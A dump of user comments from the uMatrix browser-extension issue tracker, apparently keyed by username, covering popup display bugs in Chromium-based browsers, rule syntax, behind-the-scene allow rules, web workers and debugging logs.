    "Whoareyouagain": "I will add more details. It is uMatrix is blocking the javascript. I tested with uBlock without uMatrix enabled, it work just fine. It is uMatrix is causing the issue.\nI log in my account with the user name and the password, it proceed to log. When it accept the user name and password, it redirect the page to JavaScript Disabled warning and asked me to turn it on. I tested it in Guest Mode (no addons) and it work just fine without uMatrix. All of the script is enabled in uMatrix, it still not allowing chase to function without the javascript. I have provide screenshot of the webpage and the uMatrix Script page. \n\n\n. Sorry, I forgot to add the log. Here it is. I believe I have it fixed. the issue is I am denying script to chasecdn.com which cause it to claim the javascript is disabled. I disabled uMatrix and log in my account, then I reenable uMatrix to see which script is blocked. I discovered it was chasecdn.com. Odd enough, Chasecdn.com never show up in the list when I first load Chase.com. When I add chasecdn in approved section, chasecdn automatically show up in the list from now on. That is why I never see chasecdn.com in the first place.\nChase Log.txt\n. ",
    "mweinelt": "huh, ok. for completeness sake here is what I tried and didn't work.\n\n. ",
    "Dbz": "It is possible that my browser being Chrome may make a difference, but I don't know.\nI disabled matrix filtering for the scope at Google Fiber\n\nWhen the popup loads, even though I disabled matrix filtering for the scope, the popup's content doesn't load:\n\nThe additional sources that the popup needs to load from are not shown on the original page where it loaded from, so there is no way to enable them without loading the url in a different tab and then changing them there (Would a custom ruleset fix this?).\nHere are the sources needed when the popup is loaded in a new tab:\n. This is my first time contributing to this project, so I'm very unfamiliar with the terminology, so forgive me. I also have a custom ruleset, and I've been using uMatrix (and uBlock) for quite a while, and I know how to fix it to allow the popup to load. Subsequently, now that I have confirmed that this is expected behavior, may I suggest a feature? There are actually a couple ways I see to solve this, but what I prefer is displaying two matrices on the host page.\n\nThis feature would allow all popups to be managed on the original page they came from without reloading the popup in a new tab. This isn't a problem for me on this one site; it happens every time there is a popup. \nI also think a configuration option would suffice [ ] When matrix filtration is disabled, also disable it for popups (Or something similar). Another alternative would be to allow matrix filtration on the actual popups because currently that's not an option:\n\nIs this a welcome change?. @adrienbeau @gorhill  How do you feel about this proposed feature? If the notification from this comment gets buried then I can make a new issue/feature request with the proposed feature instead of a bug.. ",
    "ThisIsAlanB": "Alright. Thank you very much!. ",
    "levicki": "Not bad but I would still prefer some sort of wildcard such as * if full regex is out of the question for performance reasons.\nIn any case there is definitely a need for some feature which will ease list maintenace.. OK, so you are basically telling me \"you are holding it wrong\"?\nHow then would you suggest using it to accomplish the filters similar to this?\nWhen I asked \"How would you optimize this\" I meant the rules for such case.. @gorhill \nCan you please point to where did I ask you to rewrite anything, much less from the ground up?\nI put the word \"question\" in the issue subject and I even specifically stated that I am aware you are against the regex and asked for alternatives.\nAll I wanted is to discuss how to handle issue with TLDs, and see if anyone has any good ideas, no need to get so defensive and rude about a simple question.. That is not the same as asking for a full rewrite.\nYes, I did ask whether you would perhaps consider a simple wildcard or if there is any alternative to regex you might consider. You did not answer that at all, you just rage-quit and clossd the issue which was clearly labeled as a question, not even a feature request.\nI am sorry if I offended you somehow, I didn't know that simply asking questions and stating own preferences is such a cardinal sin in your book. Thanks for hearing me out and for being so open to attempts at constructive discussion.. Does it help if you put the URL in matrix-off?. @gorhill \nMy bad, forgot to mention that the images from static.payserve.com would not load even from the page they were on (possibly NSFW):\nhttp://mysexykittens.com/photo.php?slug=c17_freshfaces_696\n\nShouldn't the rule I had allowed that? I don't understand why it is still being blocked.\nThanks for explanation about doc filter though, wasn't aware of that at all. Also, you are probably right about uBlock <-> uMatrix confusion about whitelisting -- those screens look way too similar.. Then it must be uBlock Origin, that is the only other thing I have that might be blocking it. But according to you I have added a permanent exception there... now I am confused.. @gorhill \nThanks for the detailed explanation. It would be really helpful if this could be made more clear in a respective uBlock Origin / uMatrix window which shows up when something is blocked.. Which is a duplicate of #46, an almost four year old issue. Is it impossible to fix?\nI see Raymond's comment about browser rendering the text and uMatrix not knowing it will be cut, but it seems to be possible to check the text width in pixels by using invisible DIV:\nhttps://stackoverflow.com/questions/118241/calculate-text-width-with-javascript\nI am not sure how much that would slow the rendering though?. Well it turns out that in HTML5 you can use canvas to measure text width:\nfunction getTextWidth(text, font) {\n    // if given, use cached canvas for better performance\n    // else, create new canvas\n    var canvas = getTextWidth.canvas || (getTextWidth.canvas = document.createElement(\"canvas\"));\n    var context = canvas.getContext(\"2d\");\n    context.font = font;\n    var metrics = context.measureText(text);\n    return metrics.width;\n};\n...\ngetTextWidth(\"bw-1651cf0d2f737d7adeab84d339dbabd3-bwcore.s3.amazonaws.com\", \"bold 12pt arial\");\nThis shouldn't slow down the popup, @gorhill what do you think Raymond?. ",
    "ddraws": "@levicki It's best to use uMatrix dynamically. Maintaining a rule list is very inefficient in this case. . I understand your frustration but a bug is a bug https://bugs.chromium.org/p/chromium/issues/detail?id=428044\nPlease ask Chromium devs why they haven't fixed this in 3 years.. Duplicate of https://github.com/gorhill/uMatrix/issues/694. Duplicate of https://github.com/gorhill/uMatrix/issues/694.\nIt's a bug in the browser I think https://bugs.chromium.org/p/chromium/issues/detail?id=428044. ",
    "will1818": "@AlexPoulsen please also see https://github.com/drduh/macOS-Security-and-Privacy-Guide/issues/93 for safari issues, you are better off sticking with chromium. ",
    "AlexPoulsen": "I will look into deleting those automatically, thanks. I would consider using chromium, but never chrome.. ",
    "chronokitsune3233": "I see there were a lot of changes in this commit, so matrix-off is the newer syntax. The reason for changing from switch to matrix apparently was that switch was too generic of a name and didn't really describe things.\nI'm still not sure why matrix: URI {on|off} was changed to matrix-off: URI {true|false}, but it's something I can live with.\nSorry for any wasted time.. ",
    "basementRot": "I should also add that other people have claimed to have this problem too. Nobody had made a specific bug report about it though.. Well I click \"Disable/enable matrix filtering for this scope\" about a million times a day, so a hotkey (like shift+z) would be fantastic. This may not be the best, security wise, but uMatrix seems to break vital features on a great many websites. And on the well known, probably safe sites I really don't feel like taking the time to be choosy, carefully selecting all my blocks/allows.\nMaybe you can think of some good hotkeys to solve what I see as the main problem.\nuMatrix blocks important scripts, this ends up breaking a websites important functionality. Things like logging in to a site, or making purchases with shopping carts. It would be nice to fix problems like that with a simple hotkey, especially on most big sites that people trust.\n. ",
    "jonas2515": "Yeah, I have the same problem, but no keyboard shortcuts are working at all. I'm using Chromium 55.0.2883.75 and uMatrix 0.9.3.6 on Debian unstable.. ",
    "IgelRM": "I can confirm this too, using Chrome v56.0.2924.87 and uMatrix v0.9.3.6.\n@gorhill can you add a word on this please. I am using uMatrix since quite some time and liking it.. Could you please set up shortcuts for Chrome with the WebExtension standard as they should also function with Firefox when the UI later gets implemented, if I understand this correctly.. ",
    "madduck": "AFAICT, uMatrix is now a proper WebExtension, and I also just came here longing for key combos to control uMatrix.\nAny news?. I'm envisioning being able to hit e.g. ctrl-alt-m to have the dialog pop open, using the arrow keys to move around like in a spreadsheet and then the ability to toggle the verdict for columns, rows, and single cells with e.g. enter.\nOnce you have that, then adding additional shortcuts should be simple, maybe even macros.. Indeed. There's even a small cogwheel that I just didn't see. Many thanks.. Thank you @gorhill, this is precisely what I was looking for. I am\nsorry I didn't know about the wiki beforehand\u2026\n-- \nThe sender e-mail address used (github.com@pobox.madduck.net)\nis valid and specific to our correspondence. It should not indicate any\naffiliation with your organisation.\nDie verwendete E-mail-Adresse (github.com@pobox.madduck.net)\nist g\u00fcltig und spezifisch f\u00fcr unsere Korrespondenz. Sie soll in keiner Weise\nauf eine Verbindung mit Ihrer Organisation hindeuten.\nSpamtrap: github.com.bogus@pobox.madduck.net\n. ",
    "lonkamikaze": "Same problem here on Chromium Version 56.0.2924.87 (64-bit).\nIt might be worth mentioning that my screen has 160 DPI and chrome renders things accordingly. I.e. I'm not using some fake DPI that causes everything to be tiny.. Maybe some details are in order. The problem is not that there is no scroll bar, the problem is that the uMatrix window is too big and cut off in the bottom.\nGiven enough items in the table a scroll bar will show up, but of course you cannot scroll further than all the way down, so you never get to see the bottom most items.\nThe impression that the scroll bar is not working comes from the case when the uMatrix window is too big to fit into the Chrome window, but is big enough to contain the whole table without scrolling. This happens surprisingly often.\n\n. ",
    "Saucermote": "I think there is some sort of bug going on however, because frequently it isn't displaying all of the columns to let me pick what type of content to allow as the window is way too small; randomly the XHR, frame, other column get cut off completely.   It takes reopening the webpage, refreshing, tab switching to finally get the window to show me all the options I need to get the page to open correctly.  Then it is a 50/50 shot if I'm able to scroll down far enough to see all the rest of the options without something being cut off.   Most of the time it works correctly, but some random sites it will just cut everything off at the bottom and right, or it will just display a gear when I hit the button.. I'm on Win 7 x64, no idea what they are on.. I think I actually figured out what is causing the issue on my end, it is the UI scaling. Anything other than normal UI scaling causes the popup window to randomly not display correctly.  Normally I run with a smaller UI, which you would think allow more space for the window to display, not less, but resetting the chromium/vivaldi UI to the default size causes the config window to display correctly, at least for now.\nEdit: I'm not positive where the bug lies exactly for this, but I did file a UI scaling bug with the Vivaldi team.. Take a page such as http://digiday.com/ and set your browser to a smaller windowed mode if your monitor is too big to reproduce.  The website connects to so many sources that the list gets huge, and there is no ability to scroll the extension popup.  \nThis goes hand in hand with my request here https://github.com/gorhill/uMatrix/issues/683\n\nI never think to come here and post when I hit a page with enormous numbers of requests to external sites, but invariably they are a million links to ad networks and cdn's, and they just start dropping off the bottom of the screen and you can't get to them.  The above site is just an example with a large number of requests I found with a google search.  It would just be nice if a scroll bar was a toggle in the options please to not inconvenience others without this problem.  \nLike the above poster, I'm running Vivaldi, a Chromium browser, but I'm on Windows 7. . I'll file a report with the Vivaldi team.  . I'm not sure what changed, but the problem has somehow gotten worse.  It now scrolls (no scroll bar, but mouse scroll works), but it routinely cuts off items at the bottom and I can't scroll down to them (somtimes they are half cut off and I can see the top of them), especially if blocked domains are collapsed.  It typically gets worse if I need to enable a script or other item and reload the page, and it causes the page to load additional domains or subdomains. \nEdit: Here I was browsing the Square-Enix store and having a dickens of a time getting down to pepitastore item I need to enable.  Even now when I go back to that tab the Umatrix extension window is showing some minature version of itself.  \nhttps://store.eu.square-enix.com/eu\nThis is scrolled down all the way, see how the twitter item is cut in half and it doesn't even get to the banned domains.  Opening other tabs and resizing windows seems to change the point at which it errors out.\n\n. The fix that they did wasn't in response to the bug report I submitted before, or at least no only due to it, as the numbers didn't match up.  But my monitor is a standard 1080 pixel height, so there is no reason the browser should be triggering this at that height unless they took a shortcut like ublock-o was doing with Firefox to trigger the scrollbar.   I'm not even sure what to send over as a bug report other than to just try to point them to this issue thread again.. ",
    "Sorunome": "That was trial and error, but as I wrote the JS program in question i know for sure that example.com creats it.. Apparently it sees it as behind-the-scene. That still doesn't mean there's an easy way to set it, only a way to manually set it in the ruleset. Well, that is exactly whatshared workers are for: having a JS runtime that are not attached to a tab, so that you can have e.g. only one websocket connection open for multiple tabs to your server. Or do some other lifiting into that shared environment. (So I wouldn't say htat it's a browser bug, as, well, the browser can't report a tab its belonging to as there isn't ONE tab it's belonging to)\nWhat may be an option is add to that blue drop-down thing the behind-the-scenes or something in addition to * or something?. ",
    "AllanWegan": "An example for a webworker wich requests i do not see at all in the log:\nhttps://thedisconnect.co/one/\nChromium 64.0.3282.186 on Gentoo.. Now that was unexpected: Chromium sometime keeps running the webworker for a minute or so after closing the tab. And they also seem to get cached, so it was already there when i came back to the site later and started poking around.\nWould be nice to have a seperate column for web workers in uMatrix between XHR and frame.. ",
    "aeris": "Hello people\u00a0!\nFor security/privacy concerns, you don\u2019t want to directly allow youtube/google/cloudflare from anywhere, but currently, because of the behaviour reported by @k-h, you have to refresh your page multiple times. 5\u00d7 for ReCaptcha for example, and the last refresh is only possible after you fill the captcha and validate the form and then you got the last XHR request pointing to another domain.\nWould be interesting to have a dropdown menu with pre-filled temporary rules (ReCaptcha, Youtube\u2026) to apply on the current page without having real blocked request to corresponding domains, reducing refresh needed to 1.. ",
    "ibotty": "Aeris is right. Many don't want to allow youtube globally. It would be great, if there was a dropdown that will add some predefined rules to the active scope. I opened a issue about that: #702.. Oh. I did not find that issue. Thanks for your work bzw.. ",
    "JoaoAparicio": "Thank you, that settles it.. ",
    "400thecat": "No, \"Color Blind Friendly\" is not checked. ",
    "xofe": "This was changed quite a while ago (with commit https://github.com/gorhill/uMatrix/commit/44f1a61c42fb3c0357774ea176ef0ea6a9591642).\nThe new background style can be changed, though I don't know the procedure for Chrome/Chromium. In Firefox, it is set using extensions.umatrix.placeholderBackground about:config preference.. Can't seem to reproduce using Firefox 53 beta + uMatrix 0.9.9b7, though the site does take an awful long time to load (but that seems to be a server thing, not an issue with uMatrix).\nPossibly related: https://github.com/gorhill/uBlock/issues/936. Can confirm. It seems the type for media resources is set to image in line 1719 of /platform/firefox/vapi-background.js.\nChanging this value to media (as it was set before https://github.com/gorhill/uMatrix/commit/83b342d4e4d768d57f1c982d9bf6b673ad35526e) causes the resource to be correctly reported in the media column, and listed in the logger as type media.. Duplicate of #597. This should be fixed in the dev build, if you're willing to try that out.. > not fixed! The rule I've set is still lost over a restart. Can you reproduce this?\nAh, I can reproduce this. Looks like the [fd00::9ec7:a6ff:fe70:cb36] * script allow rule is mistakenly considered an unknown directive (due to the : character in hostname) and therefore ignored.. I can reproduce this when using the Random Agent Spoofer extension, with the Headers -> Spoof If-None-Match (ETags) option enabled. Perhaps you have something similar modifying request headers?\n\n. I've run into this issue also, where the added CSP header (disabling scripts) was sometimes not being cleared when using the refresh button, and using the bypassCache option indeed fixes it. (Possibly related: #812, #816, #817)\nI noticed the commented-out flags argument for vAPI.tabs.reload, took a deeper look, and it seems the platform-independent code (in src/js/tab.js) already passes the bypassCache option in this flags argument, just the chromium/webext code is not bothering to use it.\nhttps://github.com/gorhill/uMatrix/blob/88912170fc33bb8620e1c71e1ddc98c3807892a5/src/js/tab.js#L573-L575\nPerhaps a better fix would be to pass this flags argument through to chrome.tabs.reload?. Glad I could contribute!. Unless they're also submitted at Crowdin, then yes, they would be overwritten.. You're welcome!\nAny thoughts on the changes in https://github.com/gorhill/uMatrix/compare/master...rhendric:cleaning (uBlockOrigin/uMatrix-issues#16)? I didn't include them in this PR as I wasn't sure if the authorship would be preserved.. ",
    "jendrikw": "Same for firefox.. ",
    "Goldich": "Sorry, but closing without explanation is really unfriendly.. ",
    "californicated": "I forgot to mention that the issue affects Chrome v55 as well as Firefox v50. Both as x64 version. . All three switches are turned off as per default. Still thanks for your reply!. ",
    "nullannos": "I've had this issue also. When I install umatrix in chrome and load a website with a lot of requests it works as intended with a scrollbar, however in Vivaldi this doesn't work for me. The log shows the requests but there is no scrollbar.\nThis is in Windows & Linux. . ",
    "hipunk": "I filed a bugreport as well.\ngorhill, can't you implement a temporary workaround for us?\nEverything works, all of the features, but we cannot click the items.\nMy Firefox is dead, I need a browser ASAP.\nPleeaaaase?\nPretty please?\nGreetz, \nhipunk. Doh!\nIt seems that the bug was/is merely the user interface scaling in vivaldis preferences!\nClick reset in the settings of vivaldi, like here:\nhttps://imgoat.com/uploads/93f65e080a/58108.png\nAnd it works again.\nTo me, it seems like this bug can almost be closed here.\nGreetz,\nhipunk. ",
    "berlinjunker": "I also seem to have the same problem.\nSpecs:\n\nResolution of 3840x2160 - scaled to 2560x1440\nMacOS Sierra 10.12.1\nChrome 55.0.2883.95\n\nEven though, the issue has been already posted, I doubt that this is supposed to be an chromium issue.\nRelated post: https://github.com/gorhill/uMatrix/issues/114#issuecomment-83701082\nOn my Macbook Air 13\" with a 100% scaling, I haven't seen this issue at all so my guess is that only scaled displays (retina displays) are affected.. Are you sure, that you are using a non-retina display? Because your screenshots looks high-res to me. And resolutionwise, I would say that it is in fact a Hi-Res screenshot.\nEDIT: I also think, that error only occurs on MacOS. ",
    "beefstew": "This bug occurs for me on an early 2011 MacBook Pro 15\" without Retina and resolution set to \"Default for display\", so I'm not sure it's scaling related.. I use both a 2011 non-Retina MacBook Pro and a mid-2015 Retina MacBook Pro. It occurs in Chrome on both laptops \u2013\u00a0both on the built-in LCD and on external monitors (running in their native resolution).. ",
    "snafuy": "Confirm that this happens regardless of display resolution. Affects both my Pre-retina MacBook and TouchBar MBP, on the internal screen, external monitor, or HDTV.. ",
    "altunyurt": "Same on Firefox 53b\n\n. @gorhill while it was happening, it wasn't everytime.  I'm running ff53b6 on linux mint right now and i don't remembr it occuring since i posted the previous comment, maybe the ff updates helped.  \nIt now works on the same page in my prev. comment \n\n . ",
    "sgreadly": "This is by far the most annoying bug. It happens on both my Macbook Pro and MacbookAir, on several uMatrix and Chrome versions (as back as 1 year at least and up to the latest version).\nAgain it's really hard to troubleshoot because it's random, but it happens on just about every website. And you have to click to expand it again say 10 - 20 times to get it to finally pop up properly. Do it again once or twice and the problem happens again.\nI tried refreshing the page, or moving the content up/down a bit, but that doesn't really help. And I don't believe it is related to the content, because even simple sites like google.co.nz can have this issue. \nAs an example & quick test. Even on this page as I type, I tried expanding it and the popup was successful 3 times. The 4th time, the problem happened, and I took a screenshot.\nI'm happy to help troubleshooting though if there's anything you need.\nTa.\n\n. ",
    "zmwangx": "It's been this way for ages IIRC and happens for my other extensions too. A link to the Chromium bug report has already been posted above: \nhttps://bugs.chromium.org/p/chromium/issues/detail?id=428044. I doubt anything can be done here.. ",
    "gson88": "I have the same issue on my mac.\nMaybe you can add the workaround posted in the chromium bug report?\nSetting display: none; then display: block; on the body-element works for me when testing.. I only tested it by inspecting the elements and changing the css from the inspector. \nI'm trying to find where to put it, not very experienced in browser extensions. . It doesn't help unfortunately. No difference.\nIs there an event for when the animation is done?. The most consistent \"fix\" seems to be this:\nsetTimeout(function(){\n    document.body.style.display = \"none\";\n\n    setTimeout(function(){\n        document.body.style.display = \"block\";\n    }, 5);\n}, 300);\n\nBut it makes the whole popup flash a little bit after opening. Not a pretty fix. And I'm not sure how it looks on windows.\nEdit: Inside onMatrixSnapshotReady. Yes it is \ud83d\udc4d\nIt's called twice, once with height 208 (which seems to be the min-height), and then once with the height of the finished popup. \nWhen the bug happens, it still says it's for instance 600px.. I get \n416x208 416x208\n523x600 523x600\nboth when its working and not working.. ",
    "raylee": "I have the same problem (OSX/Chrome) and DOM is reporting the wrong values for me as well. If I set the width to the existing width+1, it forces a resize.\nAny solution for detecting the anomalous state will likely be on a timeout. Perhaps instead on OSX uMatrix could simply change the size on that timeout. If the problem didn't occur, there will be no noticeable flash, just a tiny resize. If the problem did occur (which seems most of the time now), it'll at least address the issue.. ",
    "hardfalcon": "I have exactly the same issue with uMatrix in Firefox on Archlinux x86_64. For some reason, most (all?) sites using UTF-8 encoding get misdetected as \"western encoding\" (I suppose this is ISO-8859-1), thus displaying for example German umlauts as garbled text (\"\u00df\" gets displayed as \"\u00c3\u0178\", \"\u00f6\" as \"\u00c3\u00b6\", \"\u00e4\" as \"\u00c3\u00a4\", etc). Of course, this only affects sites that do not use HTML entities for their non-ASCII characters, so you can't be sure the bug is not occurring by just loading some random website that happens to have umlauts on it. One reliable example seems to be https://heise.de/ tough.\nIt seems to happen when a page gets either loaded the first time or when it gets loaded from cache. When I explicitly reload the page (F5), the content encoding gets detected correctly.\nUnfortunately, this does not only occur with HTML content, but also with binary stuff like videos (sometimes resulting in a crash of Firefox, probably due to some flaky demuxer) or PDF files.\nI'm yet to find out a possibility to reliably reproduce this bug because it does only occur intermittently - but when it occurs, it seemingly affects all new tabs/sites I open, and I have to reload every single new tab/site to get rid of the wrongly detected encoding.. ",
    "alexanderschnitzler": "I have that issue as well.\nSee this example screenshot.\n\n. ",
    "weflower": "Thanks, uBlock-user.\ngorhill, I also have uBlock Origin 1.11.0 installed. There's no easy steps to guarantee you'll see it, unfortunately.\nBut the basic steps are:\n1. Go to page.\n2. Click uMatrix icon on toolbar\n3. Click \"Disable/enable matrix...\"\nUI glitches or not at this point.\nNot positive yet, but for me if it's going to happen, it seems to happen the first time I'm interacting with a page. If it doesn't glitch the first time, it won't glitch unless I refresh w/out cache.. Been testing 0.9.9b5 on two machines for the past few days and haven't seen the issue again. So far so good. Thanks!. I was just about to open a similar thread. It's not a big deal but it would be nice if uBlock and uMatrix were consistent with backup/restore buttons.. ",
    "Gridlocked": "\nYesterday I made the switch to chromium (58) and noticed occasionally the popup UI would look normal and be responsive at first, but clicking on a cell would not work until I refreshed the page. I wonder if it's related. Unfortunately, I did not open the console and this does not happen reliably.\n\nI'm using Chrome 57 stable on Ubuntu 16.10 and having the same issue though it happens reliably.  I had recently changed 1st party scripts to default to block so I'm editing more frequently.  I have to reload the page in order to make the changes.   I have also seen the UI go whited out similar to the op's report - If I see the UI go white again I'll try and get a screen shot.. I just moved to Fedora from Ubuntu 16.10 and I no longer have to reload to change a cell.. Thanks!. ",
    "blockoperation": "I've managed to capture it a few times in devtools, and it seems that all of the custom properties on the cells (e.g. hostname and reqType) are lost when the poll handler is called. I guess there's some Chromium bug WRT popup contexts or something (I doubt it's an intentional change seeing as it's intermittent).\nModifying uDom to use getAttribute/setAttribute instead of actual properties for DOMList.prop (and then modifying any relevant property accesses in popup.js/settings.js/etc to match) seems to be a viable workaround.. It's still happening for me, but it's very rare.\nnodeToExpandosMap gets wiped out (cleared) when it happens, as if the nodes are being destroyed and recreated behind the scenes or something (which maybe explains why attributes aren't affected?).\nI was in in a hurry when it happened so I couldn't debug any further (and I haven't been able to reproduce it since), but hopefully this info is useful to you.. Managed to catch it again. Strangely, nodeToExpandosMap still has a few entries this time. I still have the popup open if you want me to get any more info from it.\n\nEdit: it's not necessarily triggered by click events \u2013 I've just managed to trigger it 'remotely' between two popups (by cranking up the polling rate and clicking on one of them until the other one errored out). nodeToExpandosMap has 3 entries instead of 4 this time (an identical popup without the bug has 29).\n\nEdit 2: actually, the matSection expandos seem to survive every time now \u2013 I probably just screwed something up the time I thought the map was empty.. Confirmation that attributes work (I modified the renderMatrixCell functions to set both attributes and expandos for demonstration):\n\nThere must be some Chromium bug at work here, surely?. Sorry for not responding sooner \u2013 your fix works fine here.\nAlso, it looks like they've finally fixed the upstream bug (assuming this is the same bug: https://bugs.chromium.org/p/chromium/issues/detail?id=702490), and the fix has been backported to stable (no release yet, though).. ",
    "cernekj": "So, as I had wrote, firefox extensions are unrelated (all disabled except uMatrix).\nuMatrix rules:\nmatrix-off: about-scheme true\nmatrix-off: behind-the-scene true\nmatrix-off: chrome-extension-scheme true\nmatrix-off: chrome-scheme true\nmatrix-off: localhost true\nmatrix-off: opera-scheme true\n* 1st-party * allow\nSite with quite unique blocked contents to test:\n1) open www.lidl.cz -> no requests to 3rd party sites (browser-update.org and googletagmanager.com), in the uMatrix logger you can see blocked scripts of 3rd party sites.\n2) click on some link (stay on the same site) -> no requests to 3rd party, in logger still shown red.\n3) click backward button in the Firefox -> it will requests browser-update.org and googletagmanager.com sites, in logger still shown as red.\nTested on different Operation systems.. and sorry, but I have no idea what \"behind-the-scene\" requests means.... It's tricky, I know :-) I was not sure about the bug for a months. So I haven't file it earlier.\nSorry, I don't have more sites for now. On lidl.cz it happens just more often, but not always. On other sites never, etc.\nI will let know if I will find other \"good\" site.\nMore people will watch it, better chance to find it, so people, please.... ",
    "pkrasimirov": "@gorhill Please untag \"invalid\" for this issue.. ",
    "cyann": "Thanks for the tip about behind-the-scene!\nuMatrix was blocking these host for \"xhr\" and \"other\", adding these additional rules fixed the problem:\nbehind-the-scene addons.cdn.mozilla.net other allow\nbehind-the-scene mozilla.org xhr allow\nbehind-the-scene observatory.eff.org xhr allow\nbehind-the-scene ocsp.comodoca.com other allow\nbehind-the-scene ocsp.digicert.com other allow\nbehind-the-scene raw.githubusercontent.com xhr allow\nbehind-the-scene safebrowsing.google.com other allow\nbehind-the-scene services.mozilla.com other allow\nNote: raw.githubusercontent.com is used by uMatrix to download https://raw.githubusercontent.com/gorhill/umatrix/master/assets/checksums.txt. Update: I had to add also the hosts used by uMatrix to update the Hosts Files:\nbehind-the-scene hosts-file.net xhr allow\nbehind-the-scene letsencrypt.org other allow\nbehind-the-scene malwaredomains.lehigh.edu xhr allow\nbehind-the-scene mirror.cedia.org.ec xhr allow\nbehind-the-scene ocsp.godaddy.com other allow\nbehind-the-scene pgl.yoyo.org xhr allow\nbehind-the-scene safebrowsing-cache.google.com other allow\nbehind-the-scene someonewhocares.org xhr allow\nbehind-the-scene winhelp2002.mvps.org xhr allow\nbehind-the-scene www.malwaredomainlist.com xhr allow\nThere are probably other OCSP servers that will popup in the logger.. ",
    "runofthemill": "@gorhill - this may merit a separate issue, but how can I enable this feature? \nIn Chrome 56.0.2924.87 (64-bit) on macOS:\n\nI don't see a flag to enable in chrome://flags and chrome://predictors/ doesn't have an option:\n\n. That's a very good point! \ud83d\ude39 Nevermind :P . ",
    "redactedscribe": "My only wish is consistency between the two, but it seems this is not what the author considers an issue.. ",
    "xftroxgpx": "But as far as I know, @Atavic, (and I don't know much, I'll give you that) the zoom is only allowed when the image is standalone(image url in address bar); otherwise the webpage has to provide the zoom in functionality itself through javascript(hopefully that's the only way, eg. not possible via css-only; i presume).\nHere's a question:\nCan Content-Type: image/*  be interpreted by the browser as a webpage or html perhaps? Or, if not, then maybe that(+some more) can be used to auto-allow  images from 1st party, thus allowing the zoom.\nIn other words, can the server serve a html and lie that it's an image and the browser would then attempt to show it as a webpage/run_javascript?\n\"+some more\" would be: there needs to be a way to see that the request for the image is the same as the url in the address bar, otherwise I presume there's no way to differentiate between the image being standalone(in the url address bar) or part of the webpage resources being loaded.\nAnd Would the above logic still trigger if the image is alone in a frame or iframe ? then what @Atavic said makes sense, presuming javascript in other frame(s) can access events in others(?). Presumably there would be possible to differentiate between url in address bar and frames since 'frame' is a column in uMatrix.\n\n\n$ curl -I https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\nHTTP/1.1 200 OK\nCache-Control: max-age=2592000\nLast-Modified: Thu, 27 Apr 2017 10:11:47 GMT\nETag: \"c4327bb26aa856f783346c55366dc944\"\nContent-Type: image/png\nContent-Length: 447268\nAccept-Ranges: bytes\nDate: Thu, 27 Apr 2017 10:24:21 GMT\nVia: 1.1 varnish\nAge: 752\nConnection: keep-alive\nX-Served-By: cache-fra1225-FRA\nX-Cache: HIT\nX-Cache-Hits: 1\nX-Fastly-Request-ID: d39166c1d1fea3aeed5c8d5724d29c55a733a45a\nServer: GitHub Cloud\nTiming-Allow-Origin: https://github.com\n\n\n. In a way, you could argue that, since nothing is allowed in uMatrix, then even though the image itself is in the address bar, uMatrix shouldn't display it at all xD\nThere might be something else going on, because I vaguely remember images being loaded/displayed fast, then hidden, in some webpages... which made me think chromium is really loading them anyway even though uMatrix tells it not to. I'll investigate to see if this is so, and if not, edit this with strike.I must've been wrong, can't repro. OR, maybe this was only happening on chromium startup when chromium loads tabs from last session without waiting for the extensions to be fully loaded(unsure if this still happens with current/latest chromium, but used to)... ok it doesn't matter, I'm sure it's nothing wrong with uMatrix in this regard anyway!. re previous comment first paragraph: the image goes away after loading Developer Tools Ctrl+Shift+J\nSteps:\n0. uMatrix must have block all (at least for cloud.githubusercontent.com )\n* * * block\n1. put this in url and press enter: https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\n2. observe that image is shown on screen\n3. open Developer Tools by pressing Ctrl+Shift+J (j or i, apparently)\n4. the image went away, and it's all black now\n5. close Developer Tools by pressing the same Ctrl+Shift+J\n6. the image is still gone, background is still black-ish.\nconsole shows:\n13:28:51.650 chrome-extension://iphimjoabppgpifmkfadpbjigcefepdp/js/contentscript.js:90 Uncaught Error: uBlock Origin: aborting content scripts for https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\n    at chrome-extension://iphimjoabppgpifmkfadpbjigcefepdp/js/contentscript.js:90\n13:28:51.848 /favicon.ico Failed to load resource: net::ERR_BLOCKED_BY_CLIENT\n. OH, actually the above is just a side-effect of 'resize', aka resizing main window makes the image go away! Maybe chromium realizes(only upon window resize) that it shouldn't have shown the image(because uMatrix blocked it? if it did)\nEDIT: resize only has effect if that tab is currently focused.\nand here be the log\n\nEDIT2: uMatrix 1.0.1.0. So I guess this issue is: the image shouldn't show up in the first place? that's why zoom isn't working, it's not supposed to work because the image isn't supposed to show up either. My guess.. Here be interesting chain of events(?):\n\n\n1723: URL_REQUEST\nhttps://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\nStart Time: 2017-04-27 13:44:26.309\n\nt=  0 [st=  0] +REQUEST_ALIVE  [dt=305]\n                --> priority = \"HIGHEST\"\n                --> url = \"https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\"\nt=  0 [st=  0]    DELEGATE_INFO  [dt=4]\n                  --> delegate_blocked_by = \"NavigationResourceThrottle\"\nt=  4 [st=  4]   +URL_REQUEST_DELEGATE  [dt=2]\nt=  4 [st=  4]      DELEGATE_INFO  [dt=2]\n                    --> delegate_blocked_by = \"extension uMatrix\"\nt=  6 [st=  6]   -URL_REQUEST_DELEGATE\nt=  6 [st=  6]    URL_REQUEST_START_JOB  [dt=1]\n                  --> load_flags = 37120 (MAIN_FRAME_DEPRECATED | MAYBE_USER_GESTURE | VERIFY_EV_CERT)\n                  --> method = \"GET\"\n                  --> url = \"https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\"\nt=  7 [st=  7]   +URL_REQUEST_START_JOB  [dt=146]\n                  --> load_flags = 37120 (MAIN_FRAME_DEPRECATED | MAYBE_USER_GESTURE | VERIFY_EV_CERT)\n                  --> method = \"GET\"\n                  --> url = \"https://cloud.githubusercontent.com/assets/26243389/25478764/aeb3f0e2-2b42-11e7-8f6d-62bc8acac28e.png\"\nt=  7 [st=  7]     +URL_REQUEST_DELEGATE  [dt=2]\nt=  7 [st=  7]        DELEGATE_INFO  [dt=2]\n                      --> delegate_blocked_by = \"extension uMatrix\"\nt=  9 [st=  9]     